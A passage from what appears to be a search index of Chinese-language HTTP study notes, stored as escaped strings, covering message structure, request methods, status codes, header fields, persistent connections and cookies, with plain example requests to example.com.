\u53C2\u6570
\u5B89\u5168
\u5E42\u7B49\u6027
\u53EF\u7F13\u5B58
XMLHttpRequest \u53C2\u8003\u8D44\u6599`},{header:"\u4E00 \u3001\u57FA\u7840\u6982\u5FF5",slug:"\u4E00-\u3001\u57FA\u7840\u6982\u5FF5",content:""},{header:"\u8BF7\u6C42\u548C\u54CD\u5E94\u62A5\u6587",slug:"\u8BF7\u6C42\u548C\u54CD\u5E94\u62A5\u6587",content:`\u5BA2\u6237\u7AEF\u53D1\u9001\u4E00\u4E2A\u8BF7\u6C42\u62A5\u6587\u7ED9\u670D\u52A1\u5668\uFF0C\u670D\u52A1\u5668\u6839\u636E\u8BF7\u6C42\u62A5\u6587\u4E2D\u7684\u4FE1\u606F\u8FDB\u884C\u5904\u7406\uFF0C\u5E76\u5C06\u5904\u7406\u7ED3\u679C\u653E\u5165\u54CD\u5E94\u62A5\u6587\u4E2D\u8FD4\u56DE\u7ED9\u5BA2\u6237\u7AEF\u3002
\u8BF7\u6C42\u62A5\u6587\u7ED3\u6784\uFF1A \u7B2C\u4E00\u884C\u662F\u5305\u542B\u4E86\u8BF7\u6C42\u65B9\u6CD5\u3001URL\u3001\u534F\u8BAE\u7248\u672C\uFF1B
\u63A5\u4E0B\u6765\u7684\u591A\u884C\u90FD\u662F\u8BF7\u6C42\u9996\u90E8 Header\uFF0C\u6BCF\u4E2A\u9996\u90E8\u90FD\u6709\u4E00\u4E2A\u9996\u90E8\u540D\u79F0\uFF0C\u4EE5\u53CA\u5BF9\u5E94\u7684\u503C\u3002
\u4E00\u4E2A\u7A7A\u884C\u7528\u6765\u5206\u9694\u9996\u90E8\u548C\u5185\u5BB9\u4E3B\u4F53 Body
\u6700\u540E\u662F\u8BF7\u6C42\u7684\u5185\u5BB9\u4E3B\u4F53 GET http://www.example.com/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Host: www.example.com
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947+gzip"
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 xxx param1=1&param2=2
\u54CD\u5E94\u62A5\u6587\u7ED3\u6784\uFF1A \u7B2C\u4E00\u884C\u5305\u542B\u534F\u8BAE\u7248\u672C\u3001\u72B6\u6001\u7801\u4EE5\u53CA\u63CF\u8FF0\uFF0C\u6700\u5E38\u89C1\u7684\u662F 200 OK \u8868\u793A\u8BF7\u6C42\u6210\u529F\u4E86
\u63A5\u4E0B\u6765\u591A\u884C\u4E5F\u662F\u9996\u90E8\u5185\u5BB9
\u4E00\u4E2A\u7A7A\u884C\u5206\u9694\u9996\u90E8\u548C\u5185\u5BB9\u4E3B\u4F53
\u6700\u540E\u662F\u54CD\u5E94\u7684\u5185\u5BB9\u4E3B\u4F53 HTTP/1.1 200 OK
Age: 529651
Cache-Control: max-age=604800
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 648
Content-Type: text/html; charset=UTF-8
Date: Mon, 02 Nov 2020 17:53:39 GMT
Etag: "3147526947+ident+gzip"
Expires: Mon, 09 Nov 2020 17:53:39 GMT
Keep-Alive: timeout=4
Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT
Proxy-Connection: keep-alive
Server: ECS (sjc/16DF)
Vary: Accept-Encoding
X-Cache: HIT <!doctype html>
<html>
<head> <title>Example Domain</title> // \u7701\u7565... </body>
</html>`},{header:"URL",slug:"url",content:`HTTP \u4F7F\u7528 URL\uFF08 U niform Resource Locator\uFF0C\u7EDF\u4E00\u8D44\u6E90\u5B9A\u4F4D\u7B26\uFF09\u6765\u5B9A\u4F4D\u8D44\u6E90\uFF0C\u5B83\u662F URI\uFF08Uniform Resource Identifier\uFF0C\u7EDF\u4E00\u8D44\u6E90\u6807\u8BC6\u7B26\uFF09\u7684\u5B50\u96C6\uFF0CURL \u5728 URI \u7684\u57FA\u7840\u4E0A\u589E\u52A0\u4E86\u5B9A\u4F4D\u80FD\u529B\u3002URI \u9664\u4E86\u5305\u542B URL\uFF0C\u8FD8\u5305\u542B URN\uFF08Uniform Resource Name\uFF0C\u7EDF\u4E00\u8D44\u6E90\u540D\u79F0\uFF09\uFF0C\u5B83\u53EA\u662F\u7528\u6765\u5B9A\u4E49\u4E00\u4E2A\u8D44\u6E90\u7684\u540D\u79F0\uFF0C\u5E76\u4E0D\u5177\u5907\u5B9A\u4F4D\u8BE5\u8D44\u6E90\u7684\u80FD\u529B\u3002\u4F8B\u5982 urn:isbn:0451450523 \u7528\u6765\u5B9A\u4E49\u4E00\u4E2A\u4E66\u7C4D\u540D\u79F0\uFF0C\u4F46\u662F\u5374\u6CA1\u6709\u8868\u793A\u600E\u4E48\u627E\u5230\u8FD9\u672C\u4E66\u3002 wikipedia\uFF1A\u7EDF\u4E00\u8D44\u6E90\u6807\u5FD7\u7B26
wikipedia: URL
rfc2616\uFF1A3.2.2 http URL
What is the difference between a URI, a URL and a URN?`},{header:"\u4E8C\u3001HTTP \u65B9\u6CD5",slug:"\u4E8C\u3001http-\u65B9\u6CD5",content:"\u5BA2\u6237\u7AEF\u53D1\u9001\u7684 \u8BF7\u6C42\u62A5\u6587 \u7B2C\u4E00\u884C\u4E3A\u8BF7\u6C42\u884C\uFF0C\u5305\u542B\u4E86\u65B9\u6CD5\u5B57\u6BB5\u3002"},{header:"GET",slug:"get",content:"\u83B7\u53D6\u8D44\u6E90 \u5F53\u524D\u7F51\u7EDC\u8BF7\u6C42\u4E2D\uFF0C\u7EDD\u5927\u90E8\u5206\u4F7F\u7528\u7684\u662F GET \u65B9\u6CD5\u3002"},{header:"HEAD",slug:"head",content:`\u83B7\u53D6\u62A5\u6587\u9996\u90E8 \u548C GET \u65B9\u6CD5\u7C7B\u4F3C\uFF0C\u4F46\u662F\u4E0D\u8FD4\u56DE\u62A5\u6587\u5B9E\u4F53\u4E3B\u4F53\u90E8\u5206\u3002
\u4E3B\u8981\u7528\u4E8E\u786E\u8BA4 URL \u7684\u6709\u6548\u6027\u4EE5\u53CA\u8D44\u6E90\u66F4\u65B0\u7684\u65E5\u671F\u65F6\u95F4\u7B49\u3002`},{header:"POST",slug:"post",content:`\u4F20\u8F93\u5B9E\u4F53\u4E3B\u4F53 POST \u4E3B\u8981\u7528\u6765\u4F20\u8F93\u6570\u636E\uFF0C\u800C GET \u4E3B\u8981\u7528\u6765\u83B7\u53D6\u8D44\u6E90\u3002
\u66F4\u591A POST \u4E0E GET \u7684\u6BD4\u8F83\u8BF7\u89C1\u7B2C\u4E5D\u7AE0\u3002`},{header:"PUT",slug:"put",content:`\u4E0A\u4F20\u6587\u4EF6 \u7531\u4E8E\u81EA\u8EAB\u4E0D\u5E26\u9A8C\u8BC1\u673A\u5236\uFF0C\u4EFB\u4F55\u4EBA\u90FD\u53EF\u4EE5\u4E0A\u4F20\u6587\u4EF6\uFF0C\u56E0\u6B64\u5B58\u5728\u5B89\u5168\u6027\u95EE\u9898\uFF0C\u4E00\u822C\u4E0D\u4F7F\u7528\u8BE5\u65B9\u6CD5\u3002
PUT /new.html HTTP/1.1
Host: example.com
Content-type: text/html
Content-length: 16 <p>New File</p>`},{header:"PATCH",slug:"patch",content:`\u5BF9\u8D44\u6E90\u8FDB\u884C\u90E8\u5206\u4FEE\u6539 PUT \u4E5F\u53EF\u4EE5\u7528\u4E8E\u4FEE\u6539\u8D44\u6E90\uFF0C\u4F46\u662F\u53EA\u80FD\u5B8C\u5168\u66FF\u4EE3\u539F\u59CB\u8D44\u6E90\uFF0CPATCH \u5141\u8BB8\u90E8\u5206\u4FEE\u6539\u3002
PATCH /file.txt HTTP/1.1
Host: www.example.com
Content-Type: application/example
If-Match: "e0023aa4e"
Content-Length: 100 [description of changes]`},{header:"DELETE",slug:"delete",content:`\u5220\u9664\u6587\u4EF6 \u4E0E PUT \u529F\u80FD\u76F8\u53CD\uFF0C\u5E76\u4E14\u540C\u6837\u4E0D\u5E26\u9A8C\u8BC1\u673A\u5236\u3002
DELETE /file.html HTTP/1.1`},{header:"OPTIONS",slug:"options",content:`\u67E5\u8BE2\u652F\u6301\u7684\u65B9\u6CD5 \u67E5\u8BE2\u6307\u5B9A\u7684 URL \u80FD\u591F\u652F\u6301\u7684\u65B9\u6CD5\u3002
\u4F1A\u8FD4\u56DE Allow: GET, POST, HEAD, OPTIONS \u8FD9\u6837\u7684\u5185\u5BB9\u3002`},{header:"CONNECT",slug:"connect",content:`\u8981\u6C42\u5728\u4E0E\u4EE3\u7406\u670D\u52A1\u5668\u901A\u4FE1\u65F6\u5EFA\u7ACB\u96A7\u9053 \u4F7F\u7528 SSL\uFF08Secure Sockets Layer\uFF0C\u5B89\u5168\u5957\u63A5\u5C42\uFF09\u548C TLS\uFF08Transport Layer Security\uFF0C\u4F20\u8F93\u5C42\u5B89\u5168\uFF09\u534F\u8BAE\u628A\u901A\u4FE1\u5185\u5BB9\u52A0\u5BC6\u540E\u7ECF\u7F51\u7EDC\u96A7\u9053\u4F20\u8F93\u3002
CONNECT www.example.com:443 HTTP/1.1
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc00f70e-c5c8-4d20-baf1-2d70014a97e3.jpg" width=")`},{header:"TRACE",slug:"trace",content:`\u8FFD\u8E2A\u8DEF\u5F84 \u670D\u52A1\u5668\u4F1A\u5C06\u901A\u4FE1\u8DEF\u5F84\u8FD4\u56DE\u7ED9\u5BA2\u6237\u7AEF\u3002
\u53D1\u9001\u8BF7\u6C42\u65F6\uFF0C\u5728 Max-Forwards \u9996\u90E8\u5B57\u6BB5\u4E2D\u586B\u5165\u6570\u503C\uFF0C\u6BCF\u7ECF\u8FC7\u4E00\u4E2A\u670D\u52A1\u5668\u5C31\u4F1A\u51CF 1\uFF0C\u5F53\u6570\u503C\u4E3A 0 \u65F6\u5C31\u505C\u6B62\u4F20\u8F93\u3002
\u901A\u5E38\u4E0D\u4F1A\u4F7F\u7528 TRACE\uFF0C\u5E76\u4E14\u5B83\u5BB9\u6613\u53D7\u5230 XST \u653B\u51FB\uFF08Cross-Site Tracing\uFF0C\u8DE8\u7AD9\u8FFD\u8E2A\uFF09\u3002 rfc2616\uFF1A9 Method Definitions`},{header:"\u4E09\u3001HTTP \u72B6\u6001\u7801",slug:"\u4E09\u3001http-\u72B6\u6001\u7801",content:`\u670D\u52A1\u5668\u8FD4\u56DE\u7684 \u54CD\u5E94\u62A5\u6587 \u4E2D\u7B2C\u4E00\u884C\u4E3A\u72B6\u6001\u884C\uFF0C\u5305\u542B\u4E86\u72B6\u6001\u7801\u4EE5\u53CA\u539F\u56E0\u77ED\u8BED\uFF0C\u7528\u6765\u544A\u77E5\u5BA2\u6237\u7AEF\u8BF7\u6C42\u7684\u7ED3\u679C\u3002 \u72B6\u6001\u7801
\u7C7B\u522B
\u542B\u4E49 1XX
Informational\uFF08\u4FE1\u606F\u6027\u72B6\u6001\u7801\uFF09
\u63A5\u6536\u7684\u8BF7\u6C42\u6B63\u5728\u5904\u7406 2XX
Success\uFF08\u6210\u529F\u72B6\u6001\u7801\uFF09
\u8BF7\u6C42\u6B63\u5E38\u5904\u7406\u5B8C\u6BD5 3XX
Redirection\uFF08\u91CD\u5B9A\u5411\u72B6\u6001\u7801\uFF09
\u9700\u8981\u8FDB\u884C\u9644\u52A0\u64CD\u4F5C\u4EE5\u5B8C\u6210\u8BF7\u6C42 4XX
Client Error\uFF08\u5BA2\u6237\u7AEF\u9519\u8BEF\u72B6\u6001\u7801\uFF09
\u670D\u52A1\u5668\u65E0\u6CD5\u5904\u7406\u8BF7\u6C42 5XX
Server Error\uFF08\u670D\u52A1\u5668\u9519\u8BEF\u72B6\u6001\u7801\uFF09
\u670D\u52A1\u5668\u5904\u7406\u8BF7\u6C42\u51FA\u9519`},{header:"1XX \u4FE1\u606F",slug:"_1xx-\u4FE1\u606F",content:"100 Continue \uFF1A\u8868\u660E\u5230\u76EE\u524D\u4E3A\u6B62\u90FD\u5F88\u6B63\u5E38\uFF0C\u5BA2\u6237\u7AEF\u53EF\u4EE5\u7EE7\u7EED\u53D1\u9001\u8BF7\u6C42\u6216\u8005\u5FFD\u7565\u8FD9\u4E2A\u54CD\u5E94\u3002"},{header:"2XX \u6210\u529F",slug:"_2xx-\u6210\u529F",content:"200 OK 204 No Content \uFF1A\u8BF7\u6C42\u5DF2\u7ECF\u6210\u529F\u5904\u7406\uFF0C\u4F46\u662F\u8FD4\u56DE\u7684\u54CD\u5E94\u62A5\u6587\u4E0D\u5305\u542B\u5B9E\u4F53\u7684\u4E3B\u4F53\u90E8\u5206\u3002\u4E00\u822C\u5728\u53EA\u9700\u8981\u4ECE\u5BA2\u6237\u7AEF\u5F80\u670D\u52A1\u5668\u53D1\u9001\u4FE1\u606F\uFF0C\u800C\u4E0D\u9700\u8981\u8FD4\u56DE\u6570\u636E\u65F6\u4F7F\u7528\u3002 206 Partial Content \uFF1A\u8868\u793A\u5BA2\u6237\u7AEF\u8FDB\u884C\u4E86\u8303\u56F4\u8BF7\u6C42\uFF0C\u54CD\u5E94\u62A5\u6587\u5305\u542B\u7531 Content-Range \u6307\u5B9A\u8303\u56F4\u7684\u5B9E\u4F53\u5185\u5BB9\u3002"},{header:"3XX \u91CD\u5B9A\u5411",slug:"_3xx-\u91CD\u5B9A\u5411",content:"301 Moved Permanently \uFF1A\u6C38\u4E45\u6027\u91CD\u5B9A\u5411 302 Found \uFF1A\u4E34\u65F6\u6027\u91CD\u5B9A\u5411 303 See Other \uFF1A\u548C 302 \u6709\u7740\u76F8\u540C\u7684\u529F\u80FD\uFF0C\u4F46\u662F 303 \u660E\u786E\u8981\u6C42\u5BA2\u6237\u7AEF\u5E94\u8BE5\u91C7\u7528 GET \u65B9\u6CD5\u83B7\u53D6\u8D44\u6E90\u3002 \u6CE8\uFF1A\u867D\u7136 HTTP \u534F\u8BAE\u89C4\u5B9A 301\u3001302 \u72B6\u6001\u4E0B\u91CD\u5B9A\u5411\u65F6\u4E0D\u5141\u8BB8\u628A POST \u65B9\u6CD5\u6539\u6210 GET \u65B9\u6CD5\uFF0C\u4F46\u662F\u5927\u591A\u6570\u6D4F\u89C8\u5668\u90FD\u4F1A\u5728 301\u3001302 \u548C 303 \u72B6\u6001\u4E0B\u7684\u91CD\u5B9A\u5411\u628A POST \u65B9\u6CD5\u6539\u6210 GET \u65B9\u6CD5\u3002 304 Not Modified \uFF1A\u5982\u679C\u8BF7\u6C42\u62A5\u6587\u9996\u90E8\u5305\u542B\u4E00\u4E9B\u6761\u4EF6\uFF0C\u4F8B\u5982\uFF1AIf-Match\uFF0CIf-Modified-Since\uFF0CIf-None-Match\uFF0CIf-Range\uFF0CIf-Unmodified-Since\uFF0C\u5982\u679C\u4E0D\u6EE1\u8DB3\u6761\u4EF6\uFF0C\u5219\u670D\u52A1\u5668\u4F1A\u8FD4\u56DE 304 \u72B6\u6001\u7801\u3002 307 Temporary Redirect \uFF1A\u4E34\u65F6\u91CD\u5B9A\u5411\uFF0C\u4E0E 302 \u7684\u542B\u4E49\u7C7B\u4F3C\uFF0C\u4F46\u662F 307 \u8981\u6C42\u6D4F\u89C8\u5668\u4E0D\u4F1A\u628A\u91CD\u5B9A\u5411\u8BF7\u6C42\u7684 POST \u65B9\u6CD5\u6539\u6210 GET \u65B9\u6CD5\u3002"},{header:"4XX \u5BA2\u6237\u7AEF\u9519\u8BEF",slug:"_4xx-\u5BA2\u6237\u7AEF\u9519\u8BEF",content:"400 Bad Request \uFF1A\u8BF7\u6C42\u62A5\u6587\u4E2D\u5B58\u5728\u8BED\u6CD5\u9519\u8BEF\u3002 401 Unauthorized \uFF1A\u8BE5\u72B6\u6001\u7801\u8868\u793A\u53D1\u9001\u7684\u8BF7\u6C42\u9700\u8981\u6709\u8BA4\u8BC1\u4FE1\u606F\uFF08BASIC \u8BA4\u8BC1\u3001DIGEST \u8BA4\u8BC1\uFF09\u3002\u5982\u679C\u4E4B\u524D\u5DF2\u8FDB\u884C\u8FC7\u4E00\u6B21\u8BF7\u6C42\uFF0C\u5219\u8868\u793A\u7528\u6237\u8BA4\u8BC1\u5931\u8D25\u3002 403 Forbidden \uFF1A\u8BF7\u6C42\u88AB\u62D2\u7EDD\u3002 404 Not Found"},{header:"5XX \u670D\u52A1\u5668\u9519\u8BEF",slug:"_5xx-\u670D\u52A1\u5668\u9519\u8BEF",content:"500 Internal Server Error \uFF1A\u670D\u52A1\u5668\u6B63\u5728\u6267\u884C\u8BF7\u6C42\u65F6\u53D1\u751F\u9519\u8BEF\u3002 503 Service Unavailable \uFF1A\u670D\u52A1\u5668\u6682\u65F6\u5904\u4E8E\u8D85\u8D1F\u8F7D\u6216\u6B63\u5728\u8FDB\u884C\u505C\u673A\u7EF4\u62A4\uFF0C\u73B0\u5728\u65E0\u6CD5\u5904\u7406\u8BF7\u6C42\u3002"},{header:"\u56DB\u3001HTTP \u9996\u90E8",slug:"\u56DB\u3001http-\u9996\u90E8",content:`\u6709 4 \u79CD\u7C7B\u578B\u7684\u9996\u90E8\u5B57\u6BB5\uFF1A\u901A\u7528\u9996\u90E8\u5B57\u6BB5\u3001\u8BF7\u6C42\u9996\u90E8\u5B57\u6BB5\u3001\u54CD\u5E94\u9996\u90E8\u5B57\u6BB5\u548C\u5B9E\u4F53\u9996\u90E8\u5B57\u6BB5\u3002
\u5404\u79CD\u9996\u90E8\u5B57\u6BB5\u53CA\u5176\u542B\u4E49\u5982\u4E0B\uFF08\u4E0D\u9700\u8981\u5168\u8BB0\uFF0C\u4EC5\u4F9B\u67E5\u9605\uFF09\uFF1A`},{header:"\u901A\u7528\u9996\u90E8\u5B57\u6BB5",slug:"\u901A\u7528\u9996\u90E8\u5B57\u6BB5",content:`\u9996\u90E8\u5B57\u6BB5\u540D
\u8BF4\u660E Cache-Control
\u63A7\u5236\u7F13\u5B58\u7684\u884C\u4E3A Connection
\u63A7\u5236\u4E0D\u518D\u8F6C\u53D1\u7ED9\u4EE3\u7406\u7684\u9996\u90E8\u5B57\u6BB5\u3001\u7BA1\u7406\u6301\u4E45\u8FDE\u63A5 Date
\u521B\u5EFA\u62A5\u6587\u7684\u65E5\u671F\u65F6\u95F4 Pragma
\u62A5\u6587\u6307\u4EE4 Trailer
\u62A5\u6587\u672B\u7AEF\u7684\u9996\u90E8\u4E00\u89C8 Transfer-Encoding
\u6307\u5B9A\u62A5\u6587\u4E3B\u4F53\u7684\u4F20\u8F93\u7F16\u7801\u65B9\u5F0F Upgrade
\u5347\u7EA7\u4E3A\u5176\u4ED6\u534F\u8BAE Via
\u4EE3\u7406\u670D\u52A1\u5668\u7684\u76F8\u5173\u4FE1\u606F Warning
\u9519\u8BEF\u901A\u77E5`},{header:"\u8BF7\u6C42\u9996\u90E8\u5B57\u6BB5",slug:"\u8BF7\u6C42\u9996\u90E8\u5B57\u6BB5",content:`\u9996\u90E8\u5B57\u6BB5\u540D
\u8BF4\u660E Accept
\u7528\u6237\u4EE3\u7406\u53EF\u5904\u7406\u7684\u5A92\u4F53\u7C7B\u578B Accept-Charset
\u4F18\u5148\u7684\u5B57\u7B26\u96C6 Accept-Encoding
\u4F18\u5148\u7684\u5185\u5BB9\u7F16\u7801 Accept-Language
\u4F18\u5148\u7684\u8BED\u8A00\uFF08\u81EA\u7136\u8BED\u8A00\uFF09 Authorization
Web \u8BA4\u8BC1\u4FE1\u606F Expect
\u671F\u5F85\u670D\u52A1\u5668\u7684\u7279\u5B9A\u884C\u4E3A From
\u7528\u6237\u7684\u7535\u5B50\u90AE\u7BB1\u5730\u5740 Host
\u8BF7\u6C42\u8D44\u6E90\u6240\u5728\u670D\u52A1\u5668 If-Match
\u6BD4\u8F83\u5B9E\u4F53\u6807\u8BB0\uFF08ETag\uFF09 If-Modified-Since
\u6BD4\u8F83\u8D44\u6E90\u7684\u66F4\u65B0\u65F6\u95F4 If-None-Match
\u6BD4\u8F83\u5B9E\u4F53\u6807\u8BB0\uFF08\u4E0E If-Match \u76F8\u53CD\uFF09 If-Range
\u8D44\u6E90\u672A\u66F4\u65B0\u65F6\u53D1\u9001\u5B9E\u4F53 Byte \u7684\u8303\u56F4\u8BF7\u6C42 If-Unmodified-Since
\u6BD4\u8F83\u8D44\u6E90\u7684\u66F4\u65B0\u65F6\u95F4\uFF08\u4E0E If-Modified-Since \u76F8\u53CD\uFF09 Max-Forwards
\u6700\u5927\u4F20\u8F93\u9010\u8DF3\u6570 Proxy-Authorization
\u4EE3\u7406\u670D\u52A1\u5668\u8981\u6C42\u5BA2\u6237\u7AEF\u7684\u8BA4\u8BC1\u4FE1\u606F Range
\u5B9E\u4F53\u7684\u5B57\u8282\u8303\u56F4\u8BF7\u6C42 Referer
\u5BF9\u8BF7\u6C42\u4E2D URI \u7684\u539F\u59CB\u83B7\u53D6\u65B9 TE
\u4F20\u8F93\u7F16\u7801\u7684\u4F18\u5148\u7EA7 User-Agent
HTTP \u5BA2\u6237\u7AEF\u7A0B\u5E8F\u7684\u4FE1\u606F`},{header:"\u54CD\u5E94\u9996\u90E8\u5B57\u6BB5",slug:"\u54CD\u5E94\u9996\u90E8\u5B57\u6BB5",content:`\u9996\u90E8\u5B57\u6BB5\u540D
\u8BF4\u660E Accept-Ranges
\u662F\u5426\u63A5\u53D7\u5B57\u8282\u8303\u56F4\u8BF7\u6C42 Age
\u63A8\u7B97\u8D44\u6E90\u521B\u5EFA\u7ECF\u8FC7\u65F6\u95F4 ETag
\u8D44\u6E90\u7684\u5339\u914D\u4FE1\u606F Location
\u4EE4\u5BA2\u6237\u7AEF\u91CD\u5B9A\u5411\u81F3\u6307\u5B9A URI Proxy-Authenticate
\u4EE3\u7406\u670D\u52A1\u5668\u5BF9\u5BA2\u6237\u7AEF\u7684\u8BA4\u8BC1\u4FE1\u606F Retry-After
\u5BF9\u518D\u6B21\u53D1\u8D77\u8BF7\u6C42\u7684\u65F6\u673A\u8981\u6C42 Server
HTTP \u670D\u52A1\u5668\u7684\u5B89\u88C5\u4FE1\u606F Vary
\u4EE3\u7406\u670D\u52A1\u5668\u7F13\u5B58\u7684\u7BA1\u7406\u4FE1\u606F WWW-Authenticate
\u670D\u52A1\u5668\u5BF9\u5BA2\u6237\u7AEF\u7684\u8BA4\u8BC1\u4FE1\u606F`},{header:"\u5B9E\u4F53\u9996\u90E8\u5B57\u6BB5",slug:"\u5B9E\u4F53\u9996\u90E8\u5B57\u6BB5",content:`\u9996\u90E8\u5B57\u6BB5\u540D
\u8BF4\u660E Allow
\u8D44\u6E90\u53EF\u652F\u6301\u7684 HTTP \u65B9\u6CD5 Content-Encoding
\u5B9E\u4F53\u4E3B\u4F53\u9002\u7528\u7684\u7F16\u7801\u65B9\u5F0F Content-Language
\u5B9E\u4F53\u4E3B\u4F53\u7684\u81EA\u7136\u8BED\u8A00 Content-Length
\u5B9E\u4F53\u4E3B\u4F53\u7684\u5927\u5C0F Content-Location
\u66FF\u4EE3\u5BF9\u5E94\u8D44\u6E90\u7684 URI Content-MD5
\u5B9E\u4F53\u4E3B\u4F53\u7684\u62A5\u6587\u6458\u8981 Content-Range
\u5B9E\u4F53\u4E3B\u4F53\u7684\u4F4D\u7F6E\u8303\u56F4 Content-Type
\u5B9E\u4F53\u4E3B\u4F53\u7684\u5A92\u4F53\u7C7B\u578B Expires
\u5B9E\u4F53\u4E3B\u4F53\u8FC7\u671F\u7684\u65E5\u671F\u65F6\u95F4 Last-Modified
\u8D44\u6E90\u7684\u6700\u540E\u4FEE\u6539\u65E5\u671F\u65F6\u95F4`},{header:"\u4E94\u3001\u5177\u4F53\u5E94\u7528",slug:"\u4E94\u3001\u5177\u4F53\u5E94\u7528",content:""},{header:"\u8FDE\u63A5\u7BA1\u7406",slug:"\u8FDE\u63A5\u7BA1\u7406",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP1_x_Connections.png" width="800)'},{header:"1. \u77ED\u8FDE\u63A5\u4E0E\u957F\u8FDE\u63A5",slug:"_1-\u77ED\u8FDE\u63A5\u4E0E\u957F\u8FDE\u63A5",content:`\u5F53\u6D4F\u89C8\u5668\u8BBF\u95EE\u4E00\u4E2A\u5305\u542B\u591A\u5F20\u56FE\u7247\u7684 HTML \u9875\u9762\u65F6\uFF0C\u9664\u4E86\u8BF7\u6C42\u8BBF\u95EE\u7684 HTML \u9875\u9762\u8D44\u6E90\uFF0C\u8FD8\u4F1A\u8BF7\u6C42\u56FE\u7247\u8D44\u6E90\u3002\u5982\u679C\u6BCF\u8FDB\u884C\u4E00\u6B21 HTTP \u901A\u4FE1\u5C31\u8981\u65B0\u5EFA\u4E00\u4E2A TCP \u8FDE\u63A5\uFF0C\u90A3\u4E48\u5F00\u9500\u4F1A\u5F88\u5927\u3002
\u957F\u8FDE\u63A5\u53EA\u9700\u8981\u5EFA\u7ACB\u4E00\u6B21 TCP \u8FDE\u63A5\u5C31\u80FD\u8FDB\u884C\u591A\u6B21 HTTP \u901A\u4FE1\u3002 \u4ECE HTTP/1.1 \u5F00\u59CB\u9ED8\u8BA4\u662F\u957F\u8FDE\u63A5\u7684\uFF0C\u5982\u679C\u8981\u65AD\u5F00\u8FDE\u63A5\uFF0C\u9700\u8981\u7531\u5BA2\u6237\u7AEF\u6216\u8005\u670D\u52A1\u5668\u7AEF\u63D0\u51FA\u65AD\u5F00\uFF0C\u4F7F\u7528 Connection : close\uFF1B
\u5728 HTTP/1.1 \u4E4B\u524D\u9ED8\u8BA4\u662F\u77ED\u8FDE\u63A5\u7684\uFF0C\u5982\u679C\u9700\u8981\u4F7F\u7528\u957F\u8FDE\u63A5\uFF0C\u5219\u4F7F\u7528 Connection : Keep-Alive\u3002`},{header:"2. \u6D41\u6C34\u7EBF",slug:"_2-\u6D41\u6C34\u7EBF",content:`\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0CHTTP \u8BF7\u6C42\u662F\u6309\u987A\u5E8F\u53D1\u51FA\u7684\uFF0C\u4E0B\u4E00\u4E2A\u8BF7\u6C42\u53EA\u6709\u5728\u5F53\u524D\u8BF7\u6C42\u6536\u5230\u54CD\u5E94\u4E4B\u540E\u624D\u4F1A\u88AB\u53D1\u51FA\u3002\u7531\u4E8E\u53D7\u5230\u7F51\u7EDC\u5EF6\u8FDF\u548C\u5E26\u5BBD\u7684\u9650\u5236\uFF0C\u5728\u4E0B\u4E00\u4E2A\u8BF7\u6C42\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668\u4E4B\u524D\uFF0C\u53EF\u80FD\u9700\u8981\u7B49\u5F85\u5F88\u957F\u65F6\u95F4\u3002
\u6D41\u6C34\u7EBF\u662F\u5728\u540C\u4E00\u6761\u957F\u8FDE\u63A5\u4E0A\u8FDE\u7EED\u53D1\u51FA\u8BF7\u6C42\uFF0C\u800C\u4E0D\u7528\u7B49\u5F85\u54CD\u5E94\u8FD4\u56DE\uFF0C\u8FD9\u6837\u53EF\u4EE5\u51CF\u5C11\u5EF6\u8FDF\u3002`},{header:"Cookie",slug:"cookie",content:`HTTP \u534F\u8BAE\u662F\u65E0\u72B6\u6001\u7684\uFF0C\u4E3B\u8981\u662F\u4E3A\u4E86\u8BA9 HTTP \u534F\u8BAE\u5C3D\u53EF\u80FD\u7B80\u5355\uFF0C\u4F7F\u5F97\u5B83\u80FD\u591F\u5904\u7406\u5927\u91CF\u4E8B\u52A1\u3002HTTP/1.1 \u5F15\u5165 Cookie \u6765\u4FDD\u5B58\u72B6\u6001\u4FE1\u606F\u3002
Cookie \u662F\u670D\u52A1\u5668\u53D1\u9001\u5230\u7528\u6237\u6D4F\u89C8\u5668\u5E76\u4FDD\u5B58\u5728\u672C\u5730\u7684\u4E00\u5C0F\u5757\u6570\u636E\uFF0C\u5B83\u4F1A\u5728\u6D4F\u89C8\u5668\u4E4B\u540E\u5411\u540C\u4E00\u670D\u52A1\u5668\u518D\u6B21\u53D1\u8D77\u8BF7\u6C42\u65F6\u88AB\u643A\u5E26\u4E0A\uFF0C\u7528\u4E8E\u544A\u77E5\u670D\u52A1\u7AEF\u4E24\u4E2A\u8BF7\u6C42\u662F\u5426\u6765\u81EA\u540C\u4E00\u6D4F\u89C8\u5668\u3002\u7531\u4E8E\u4E4B\u540E\u6BCF\u6B21\u8BF7\u6C42\u90FD\u4F1A\u9700\u8981\u643A\u5E26 Cookie \u6570\u636E\uFF0C\u56E0\u6B64\u4F1A\u5E26\u6765\u989D\u5916\u7684\u6027\u80FD\u5F00\u9500\uFF08\u5C24\u5176\u662F\u5728\u79FB\u52A8\u73AF\u5883\u4E0B\uFF09\u3002
Cookie \u66FE\u4E00\u5EA6\u7528\u4E8E\u5BA2\u6237\u7AEF\u6570\u636E\u7684\u5B58\u50A8\uFF0C\u56E0\u4E3A\u5F53\u65F6\u5E76\u6CA1\u6709\u5176\u5B83\u5408\u9002\u7684\u5B58\u50A8\u529E\u6CD5\u800C\u4F5C\u4E3A\u552F\u4E00\u7684\u5B58\u50A8\u624B\u6BB5\uFF0C\u4F46\u73B0\u5728\u968F\u7740\u73B0\u4EE3\u6D4F\u89C8\u5668\u5F00\u59CB\u652F\u6301\u5404\u79CD\u5404\u6837\u7684\u5B58\u50A8\u65B9\u5F0F\uFF0CCookie \u6E10\u6E10\u88AB\u6DD8\u6C70\u3002\u65B0\u7684\u6D4F\u89C8\u5668 API \u5DF2\u7ECF\u5141\u8BB8\u5F00\u53D1\u8005\u76F4\u63A5\u5C06\u6570\u636E\u5B58\u50A8\u5230\u672C\u5730\uFF0C\u5982\u4F7F\u7528 Web storage 